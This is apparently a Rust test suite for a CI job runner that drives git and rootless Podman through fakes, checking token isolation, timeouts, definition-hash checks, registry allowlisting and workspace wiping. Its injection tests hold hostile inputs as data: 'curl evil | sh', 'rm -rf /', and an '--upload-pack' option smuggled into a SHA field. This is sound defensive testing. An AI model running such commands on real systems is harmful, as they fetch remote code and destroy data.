//! One job attempt with a fake process runner and a fake forge (M4 C4):
//! the argv of every call, the token's path, the timeout's kill and
//! removal, the definition hash, the clean job directory. No git, no
//! Podman, no server. Synthetic data only.
#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)] // tests may fail loudly

use std::path::PathBuf;
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use forge_client::error::ClientError;
use forge_errors::ErrorCode;
use sha2::{Digest, Sha256};

use crate::api::{Beat, ClaimedJob, JobResult, JobToken, RunnerApi};
use crate::git::GitPlan;
use crate::job::{Executor, GitLimits};
use crate::podman::{Limits, PodmanPlan};
use crate::process::{Cmd, Exit, ProcessRunner, Ran};
use crate::runner::{Handled, Runner};
use crate::workspace::Workspace;

const SHA: &str = "0123456789abcdef0123456789abcdef01234567";

fn image() -> String {
    format!("registry.internal/rust@sha256:{}", "a".repeat(64))
}

fn definition(script: &str) -> String {
    format!(
        "version: 1\nstages: [build]\njobs:\n  build:\n    stage: build\n    image: {}\n    timeout: 10m\n    script:\n      - {script}\n",
        image()
    )
}

fn hash(text: &str) -> String {
    Sha256::digest(text.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

fn claim(job_id: i64, token: &str, def: &str) -> ClaimedJob {
    ClaimedJob {
        job_id,
        attempt: 1,
        name: "build".to_owned(),
        stage: "build".to_owned(),
        image: image(),
        timeout_s: 600,
        pipeline_id: 30 + job_id,
        project_id: 2,
        git_ref: "refs/heads/main".to_owned(),
        sha: SHA.to_owned(),
        definition_hash: Some(hash(def)),
        secrets_allowed: false,
        secret_names: Vec::new(),
        job_token: JobToken::new(token.to_owned()),
    }
}

/// How the fake container ends (`podman create`, then `podman start
/// --attach`, then `podman inspect` after a 125).
#[derive(Clone, Copy)]
enum Podman {
    /// The script exits with this code.
    Exit(i32),
    TimedOut,
    /// Exit 0 after leaving a file in the work directory.
    Litter,
    /// `podman create` fails (exit 125: the image is not known).
    CreateFails,
    /// Created, but `podman start` fails before the script runs (125;
    /// the container is still `created`).
    NeverStarted,
}

/// A fake host: answers git and podman by subcommand and records every
/// call.
struct Fake {
    calls: Mutex<Vec<Cmd>>,
    definition: Mutex<String>,
    fetch_exit: i32,
    podman: Podman,
    /// The work directory of the last `podman create`.
    work: Mutex<Option<PathBuf>>,
}

impl Fake {
    fn new(def: &str, podman: Podman) -> Arc<Self> {
        Arc::new(Self {
            calls: Mutex::new(Vec::new()),
            definition: Mutex::new(def.to_owned()),
            fetch_exit: 0,
            podman,
            work: Mutex::new(None),
        })
    }

    fn calls(&self) -> Vec<Cmd> {
        self.calls.lock().unwrap().clone()
    }

    fn by(&self, program: &str, sub: &str) -> Vec<Cmd> {
        self.calls()
            .into_iter()
            .filter(|c| c.program_name() == program && subcommand(c) == sub)
            .collect()
    }
}

/// The subcommand of a recorded call (git's comes after `-C <dir>`).
fn subcommand(c: &Cmd) -> String {
    let argv = c.argv();
    if c.program_name() == "git" {
        let at = argv.iter().position(|a| a == "-C").expect("-C");
        argv[at + 2].clone()
    } else {
        argv[0].clone()
    }
}

fn work_mount(c: &Cmd) -> PathBuf {
    let arg = c
        .argv()
        .into_iter()
        .find(|a| a.starts_with("--volume=") && a.ends_with(":/workspace:rw,Z"))
        .expect("work mount");
    let inner = arg
        .strip_prefix("--volume=")
        .and_then(|a| a.strip_suffix(":/workspace:rw,Z"))
        .expect("path");
    PathBuf::from(inner)
}

impl ProcessRunner for Fake {
    fn run(
        &self,
        cmd: &Cmd,
        _limit: Duration,
        _stop: &dyn Fn() -> bool,
        out: &mut dyn FnMut(&[u8]),
    ) -> std::io::Result<Ran> {
        self.calls.lock().unwrap().push(cmd.clone());
        let ok = |stdout: Vec<u8>| Ran {
            exit: Exit::Code(0),
            stdout,
            stderr_tail: String::new(),
        };
        let sub = subcommand(cmd);
        Ok(match (cmd.program_name().as_str(), sub.as_str()) {
            ("git", "fetch") if self.fetch_exit != 0 => Ran {
                exit: Exit::Code(self.fetch_exit),
                stdout: Vec::new(),
                stderr_tail: "fatal: remote error".to_owned(),
            },
            ("git", "rev-parse") => ok(format!("{SHA}\n").into_bytes()),
            ("git", "cat-file") => ok(self.definition.lock().unwrap().clone().into_bytes()),
            ("git", _) => ok(Vec::new()),
            ("podman", "create") => match self.podman {
                Podman::CreateFails => Ran {
                    exit: Exit::Code(125),
                    stdout: Vec::new(),
                    stderr_tail: "Error: image not known".to_owned(),
                },
                Podman::Exit(_) | Podman::TimedOut | Podman::Litter | Podman::NeverStarted => {
                    *self.work.lock().unwrap() = Some(work_mount(cmd));
                    ok(b"0123abcd\n".to_vec())
                }
            },
            ("podman", "start") => match self.podman {
                Podman::Exit(0) => {
                    out(b"hello from the job\n");
                    ok(Vec::new())
                }
                Podman::Exit(code) => Ran {
                    exit: Exit::Code(code),
                    stdout: Vec::new(),
                    stderr_tail: String::new(),
                },
                Podman::NeverStarted => Ran {
                    exit: Exit::Code(125),
                    stdout: Vec::new(),
                    stderr_tail: "Error: OCI runtime error: unable to start".to_owned(),
                },
                Podman::TimedOut => Ran {
                    exit: Exit::TimedOut,
                    stdout: Vec::new(),
                    stderr_tail: String::new(),
                },
                Podman::Litter => {
                    let work = self.work.lock().unwrap().clone().expect("created");
                    assert_eq!(
                        std::fs::read_dir(&work).expect("work").count(),
                        0,
                        "a job starts in an empty work directory"
                    );
                    std::fs::write(work.join("left-by-the-job"), b"x").expect("litter");
                    ok(Vec::new())
                }
                Podman::CreateFails => panic!("never started"),
            },
            ("podman", "inspect") => match self.podman {
                Podman::NeverStarted => ok(b"created 0\n".to_vec()),
                Podman::Exit(code) => ok(format!("exited {code}\n").into_bytes()),
                Podman::TimedOut | Podman::Litter | Podman::CreateFails => {
                    ok(b"exited 0\n".to_vec())
                }
            },
            _ => ok(Vec::new()),
        })
    }
}

/// A fake forge: records log chunks and results.
#[derive(Default)]
struct Forge {
    logs: Mutex<Vec<String>>,
    completed: Mutex<Vec<(i64, JobResult, Option<i32>)>>,
    claims: Mutex<Vec<ClaimedJob>>,
}

impl RunnerApi for Forge {
    fn request_job(&self, _: u64) -> Result<Option<ClaimedJob>, ClientError> {
        Ok(self.claims.lock().unwrap().pop())
    }
    fn heartbeat(&self, _: i64, _: i32) -> Result<Beat, ClientError> {
        Ok(Beat::Running)
    }
    fn append_log(&self, _: i64, _: i32, _: i64, text: &str) -> Result<(), ClientError> {
        self.logs.lock().unwrap().push(text.to_owned());
        Ok(())
    }
    fn complete(
        &self,
        job: i64,
        _: i32,
        result: JobResult,
        exit_code: Option<i32>,
    ) -> Result<(), ClientError> {
        self.completed
            .lock()
            .unwrap()
            .push((job, result, exit_code));
        Ok(())
    }
}

struct Setup {
    _dir: tempfile::TempDir,
    exec: Executor,
    root: PathBuf,
}

fn setup(fake: &Arc<Fake>) -> Setup {
    let dir = tempfile::tempdir().expect("dir");
    let root = dir.path().to_path_buf();
    let proc: Arc<dyn ProcessRunner> = Arc::clone(fake) as Arc<dyn ProcessRunner>;
    let exec = Executor {
        proc,
        git: GitPlan::new(
            PathBuf::from("git"),
            root.join("empty.gitconfig"),
            root.join("hooks"),
        ),
        podman: PodmanPlan::new(PathBuf::from("podman"), Limits::default())
            .with_registries(vec!["registry.internal/".to_owned()]),
        workspace: Workspace::new(root.clone()),
        git_limits: GitLimits::default(),
        work_dir_max_bytes: None,
        fetch_url: Box::new(|job| {
            Ok(format!(
                "https://forge.test/api/v1/runner/jobs/{job}/repo.git"
            ))
        }),
    };
    Setup {
        _dir: dir,
        exec,
        root,
    }
}

fn run(s: &Setup, job: &ClaimedJob, forge: &Forge) -> crate::job::Outcome {
    s.exec
        .execute(job, forge, &Arc::new(AtomicBool::new(false)))
}

/// Nothing the claim or the definition holds reaches a shell: every
/// program is git or podman, the script is a file, never argv; an option
/// smuggled into the image is refused before Podman.
#[test]
fn command_injection_in_the_claim_or_script_never_reaches_a_shell() {
    let script = "echo $(id); rm -rf / ; `reboot` && curl evil | sh";
    let def = definition(&format!("\"{script}\""));
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
    for c in fake.calls() {
        let program = c.program_name();
        assert!(program == "git" || program == "podman", "{c:?}");
        for a in c.argv() {
            assert!(!a.contains("rm -rf"), "the script reached argv: {c:?}");
            assert!(!a.contains("$(id)"), "{c:?}");
        }
    }
    // The image is after `--`; an image that is an option never runs (it
    // is refused with the claim, before any call: no allowed registry).
    let mut evil = claim(8, "fgj_8_secret", &def);
    evil.image = format!("--privileged@sha256:{}", "a".repeat(64));
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let out = run(&s, &evil, &forge);
    assert_eq!(
        out.error.expect("refused").code(),
        ErrorCode::JobImageNotAllowed
    );
    assert!(fake.calls().is_empty());
    // A SHA that is an option is refused before any git.
    let mut evil = claim(9, "fgj_9_secret", &def);
    evil.sha = "--upload-pack=touch /tmp/x".to_owned();
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let out = run(&s, &evil, &forge);
    assert_eq!(
        out.error.expect("refused").code(),
        ErrorCode::JobDefinitionMismatch
    );
    assert!(fake.calls().is_empty());
}

#[test]
fn a_job_past_its_timeout_kills_and_removes_its_container() {
    let def = definition("sleep 100000");
    let fake = Fake::new(&def, Podman::TimedOut);
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.error.expect("timed out").code(), ErrorCode::JobTimedOut);
    let kill = fake.by("podman", "kill");
    assert_eq!(kill.len(), 1);
    assert_eq!(
        kill[0].argv(),
        ["kill", "--signal=KILL", "--", "forge-job-7-1"]
    );
    let rm = fake.by("podman", "rm");
    assert_eq!(rm.len(), 1);
    assert_eq!(
        rm[0].argv(),
        ["rm", "--force", "--ignore", "--", "forge-job-7-1"]
    );
    // Kill, then remove.
    let order: Vec<String> = fake
        .calls()
        .iter()
        .filter(|c| c.program_name() == "podman")
        .map(subcommand)
        .collect();
    assert_eq!(order, ["create", "start", "kill", "rm"]);
    assert!(s.exec.workspace.is_clean());
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0010"), "{logs}");
}

#[test]
fn the_work_directory_is_wiped_between_jobs() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Litter);
    let s = setup(&fake);
    let forge = Forge::default();
    for job in [7, 8] {
        // The fake asserts the work directory is empty when the container
        // starts, then leaves a file behind.
        let out = run(&s, &claim(job, &format!("fgj_{job}_secret"), &def), &forge);
        assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
        assert!(!out.workspace_dirty);
        assert!(s.exec.workspace.is_clean(), "job {job} left its directory");
        assert!(!s.root.join("job").exists());
    }
}

/// Each job's fetch carries its own token, in git's environment only; the
/// container never gets one; the log masks it.
#[test]
fn a_job_token_is_never_reused_across_jobs() {
    let def = definition("echo fgj_7_secret");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    run(&s, &claim(8, "fgj_8_secret", &def), &forge);
    let fetches = fake.by("git", "fetch");
    assert_eq!(fetches.len(), 2);
    for (fetch, (own, other)) in fetches.iter().zip([
        ("fgj_7_secret", "fgj_8_secret"),
        ("fgj_8_secret", "fgj_7_secret"),
    ]) {
        let header = fetch
            .env_value("GIT_CONFIG_VALUE_0")
            .expect("header")
            .to_string_lossy()
            .into_owned();
        assert_eq!(header, format!("Authorization: Bearer {own}"));
        assert!(!header.contains(other));
        assert!(fetch.argv().iter().all(|a| !a.contains("fgj_")));
    }
    for c in fake.calls() {
        if subcommand(&c) != "fetch" {
            assert_eq!(c.env_value("GIT_CONFIG_VALUE_0"), None, "{c:?}");
            assert!(c
                .env
                .iter()
                .all(|(_, v)| !v.to_string_lossy().contains("fgj_")));
            assert!(c.argv().iter().all(|a| !a.contains("fgj_")), "{c:?}");
        }
    }
    let logs = forge.logs.lock().unwrap().join("");
    assert!(!logs.contains("fgj_7_secret"), "{logs}");
}

#[test]
fn a_definition_hash_mismatch_fails_the_job_before_any_container() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    // The file at the commit is not the one the pipeline was planned from.
    *fake.definition.lock().unwrap() = definition("curl evil | sh");
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    let err = out.error.expect("mismatch");
    assert_eq!(err.code(), ErrorCode::JobDefinitionMismatch);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "reason" && v == "hash_mismatch"));
    assert!(fake.by("podman", "create").is_empty());
    assert!(fake.by("git", "checkout").is_empty());
    assert!(s.exec.workspace.is_clean());
    // No hash in the claim, or a job the file does not hold: the same code.
    for edit in [0, 1] {
        let mut c = claim(8, "fgj_8_secret", &def);
        if edit == 0 {
            c.definition_hash = None;
        } else {
            c.name = "deploy".to_owned();
        }
        let fake = Fake::new(&def, Podman::Exit(0));
        let s = setup(&fake);
        let err = run(&s, &c, &forge).error.expect("mismatch");
        assert_eq!(err.code(), ErrorCode::JobDefinitionMismatch);
        assert!(fake.by("podman", "create").is_empty());
    }
}

#[test]
fn a_podman_error_exit_is_container_start_failed() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::CreateFails);
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    let err = out.error.expect("start failed");
    assert_eq!(err.code(), ErrorCode::ContainerStartFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "podman_stderr" && v.contains("image")));
    assert_eq!(fake.by("podman", "rm").len(), 1);
    assert!(fake.by("podman", "start").is_empty());
    // Created, but Podman could not start it: the container never ran.
    let fake = Fake::new(&def, Podman::NeverStarted);
    let s = setup(&fake);
    let out = run(&s, &claim(9, "fgj_9_secret", &def), &Forge::default());
    let err = out.error.expect("start failed");
    assert_eq!(err.code(), ErrorCode::ContainerStartFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "podman_stderr" && v.contains("OCI")));
    assert_eq!(fake.by("podman", "rm").len(), 1);
    // M4 C4 review: the script's own exit 125 is the script's failure,
    // not Podman's (the container ran and exited with it).
    let fake = Fake::new(&def, Podman::Exit(125));
    let s = setup(&fake);
    let out = run(&s, &claim(10, "fgj_10_secret", &def), &Forge::default());
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.exit_code, Some(125));
    assert!(out.error.is_none(), "{:?}", out.error);
    assert_eq!(fake.by("podman", "inspect").len(), 1);
    // The script's own failure is a plain failed result with its code.
    let fake = Fake::new(&def, Podman::Exit(3));
    let s = setup(&fake);
    let out = run(&s, &claim(8, "fgj_8_secret", &def), &Forge::default());
    assert_eq!(out.result, JobResult::Failed);
    assert_eq!(out.exit_code, Some(3));
    assert!(out.error.is_none());
}

#[test]
fn a_failed_fetch_is_job_fetch_failed() {
    let def = definition("make");
    let fake = Arc::new(Fake {
        calls: Mutex::new(Vec::new()),
        definition: Mutex::new(def.clone()),
        fetch_exit: 128,
        podman: Podman::Exit(0),
        work: Mutex::new(None),
    });
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    let err = out.error.expect("fetch failed");
    assert_eq!(err.code(), ErrorCode::JobFetchFailed);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "step" && v == "fetch"));
    assert!(err
        .context()
        .iter()
        .all(|(_, v)| !v.contains("fgj_7_secret")));
    assert!(fake.by("podman", "create").is_empty());
    assert!(s.exec.workspace.is_clean());
}

/// The loop: a claimed job is run and its result reported.
#[test]
fn a_claimed_job_is_run_and_reported() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge
        .claims
        .lock()
        .unwrap()
        .push(claim(7, "fgj_7_secret", &def));
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_millis(50),
    };
    match runner.run_once(0).expect("claim") {
        Handled::Ran {
            job_id, reported, ..
        } => {
            assert_eq!(job_id, 7);
            assert!(reported);
        }
        Handled::Idle => panic!("a job was waiting"),
    }
    assert_eq!(
        forge.completed.lock().unwrap().as_slice(),
        [(7, JobResult::Succeeded, Some(0))]
    );
    assert!(matches!(runner.run_once(0).expect("claim"), Handled::Idle));
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("hello from the job"), "{logs}");
}

/// Real rootless Podman on the runner host (plan 14 §10.1: the Linux host
/// is not provisioned yet; development is on Windows).
#[test]
#[ignore = "needs a Linux host with rootless Podman and the image in the local store; run on the runner host with --run-ignored"]
fn a_real_container_runs_without_network_and_is_removed() {
    use crate::process::SystemRunner;
    let image = std::env::var("FORGE_RUNNER_TEST_IMAGE").expect("FORGE_RUNNER_TEST_IMAGE");
    let dir = tempfile::tempdir().expect("dir");
    let work = dir.path().join("work");
    let script = dir.path().join("script");
    std::fs::create_dir_all(&work).expect("work");
    std::fs::create_dir_all(&script).expect("script");
    std::fs::write(
        script.join("script.sh"),
        "touch /workspace/ok\n! wget -q -T 3 http://example.invalid/ 2>/dev/null\n! touch /etc/x 2>/dev/null\n",
    )
    .expect("script");
    let plan = PodmanPlan::new(PathBuf::from("podman"), Limits::default());
    let create = plan.create(&crate::podman::Container {
        name: "forge-job-test-1",
        image: &image,
        work: &work,
        script_dir: &script,
        job_id: 1,
        pipeline_id: 1,
        project_id: 1,
        sha: SHA,
    });
    let created = SystemRunner
        .run(&create, Duration::from_secs(120), &|| false, &mut |_| {})
        .expect("podman create");
    assert!(created.ok(), "{created:?}");
    let ran = SystemRunner
        .run(
            &plan.start("forge-job-test-1"),
            Duration::from_secs(120),
            &|| false,
            &mut |_| {},
        )
        .expect("podman start");
    assert!(ran.ok(), "{ran:?}");
    assert!(work.join("ok").exists());
    let state = SystemRunner
        .run(
            &plan.state("forge-job-test-1"),
            Duration::from_secs(60),
            &|| false,
            &mut |_| {},
        )
        .expect("inspect");
    assert_eq!(String::from_utf8_lossy(&state.stdout).trim(), "exited 0");
    let rm = SystemRunner
        .run(
            &plan.remove("forge-job-test-1"),
            Duration::from_secs(60),
            &|| false,
            &mut |_| {},
        )
        .expect("rm");
    assert!(rm.ok());
}

/// The git argv against the real git (2.38+): every call is accepted as
/// written (a usage error would be exit 129), the fetch fails only for the
/// unreachable server, and the pinned commit is checked out and read.
#[test]
fn the_git_calls_run_as_written_on_the_real_git() {
    use crate::process::SystemRunner;
    use std::process::Command;
    let dir = tempfile::tempdir().expect("dir");
    let work = dir.path().join("work");
    std::fs::create_dir_all(&work).expect("work");
    let hooks = dir.path().join("hooks");
    std::fs::create_dir_all(&hooks).expect("hooks");
    let empty = dir.path().join("empty.gitconfig");
    std::fs::write(&empty, b"").expect("config");
    let plan = GitPlan::new(PathBuf::from("git"), empty, hooks);
    let run = |cmd: &Cmd| {
        SystemRunner
            .run(cmd, Duration::from_secs(60), &|| false, &mut |_| {})
            .expect("git")
    };
    assert!(run(&plan.init(&work)).ok());
    // The fetch's argv parses; only the connection fails.
    let fetch = plan.fetch(
        &work,
        "http://127.0.0.1:9/api/v1/runner/jobs/1/repo.git",
        1,
        &JobToken::new("fgj_1_secret".to_owned()),
    );
    let ran = run(&fetch);
    assert!(
        matches!(ran.exit, Exit::Code(c) if c != 0 && c != 129),
        "{ran:?}"
    );
    assert!(!ran.stderr_tail.contains("fgj_1_secret"));
    // Stand in for the fetch: a commit at refs/forge/job.
    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(&work)
            .args(args)
            .env("GIT_AUTHOR_NAME", "forge-test")
            .env("GIT_AUTHOR_EMAIL", "forge-test@example.invalid")
            .env("GIT_COMMITTER_NAME", "forge-test")
            .env("GIT_COMMITTER_EMAIL", "forge-test@example.invalid")
            .output()
            .expect("git");
        assert!(out.status.success(), "{args:?}");
        String::from_utf8_lossy(&out.stdout).trim().to_owned()
    };
    std::fs::write(work.join(".forge-ci.yml"), definition("make")).expect("file");
    git(&["add", ".forge-ci.yml"]);
    git(&["commit", "-q", "-m", "synthetic"]);
    let sha = git(&["rev-parse", "HEAD"]);
    git(&["update-ref", "refs/forge/job", &sha]);
    let oid = forge_core::ObjectId::parse(&sha).expect("sha");
    let fetched = run(&plan.fetched(&work));
    assert!(fetched.ok(), "{fetched:?}");
    assert_eq!(String::from_utf8_lossy(&fetched.stdout).trim(), sha);
    let def = run(&plan.definition(&work, &oid));
    assert!(def.ok(), "{def:?}");
    assert_eq!(String::from_utf8_lossy(&def.stdout), definition("make"));
    let checkout = run(&plan.checkout(&work, &oid));
    assert!(checkout.ok(), "{checkout:?}");
}

/// M4 C4 review: an image outside the configured registries is refused
/// before any git call, pull or container (FG-CI-0011).
#[test]
fn an_image_outside_the_allowed_registries_is_refused_before_any_call() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Exit(0));
    let s = setup(&fake);
    let forge = Forge::default();
    for image in [
        format!("docker.io/library/alpine@sha256:{}", "a".repeat(64)),
        // A look-alike host: the prefix ends at a `/`.
        format!("registry.internal.evil.test/rust@sha256:{}", "a".repeat(64)),
    ] {
        let mut c = claim(7, "fgj_7_secret", &def);
        c.image = image.clone(); // clone: the assertion names it
        let out = run(&s, &c, &forge);
        assert_eq!(out.result, JobResult::Failed);
        let err = out.error.expect("refused");
        assert_eq!(err.code(), ErrorCode::JobImageNotAllowed, "{image}");
        assert!(fake.calls().is_empty(), "{:?}", fake.calls());
    }
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0011"), "{logs}");
}

/// M4 C4 review: a job whose work directory grew past
/// `work_dir_max_bytes` fails (FG-CI-0012) and the directory is wiped;
/// within the bound (or unbounded) the same job succeeds.
#[test]
fn a_work_directory_past_its_bound_fails_the_job_and_is_wiped() {
    let def = definition("make");
    let fake = Fake::new(&def, Podman::Litter);
    let mut s = setup(&fake);
    s.exec.work_dir_max_bytes = Some(0);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Failed);
    let err = out.error.expect("too large");
    assert_eq!(err.code(), ErrorCode::JobWorkspaceTooLarge);
    assert!(err
        .context()
        .iter()
        .any(|(k, v)| *k == "limit_bytes" && v == "0"));
    assert!(s.exec.workspace.is_clean());
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("FG-CI-0012"), "{logs}");
    s.exec.work_dir_max_bytes = Some(1 << 20);
    let out = run(&s, &claim(8, "fgj_8_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
}
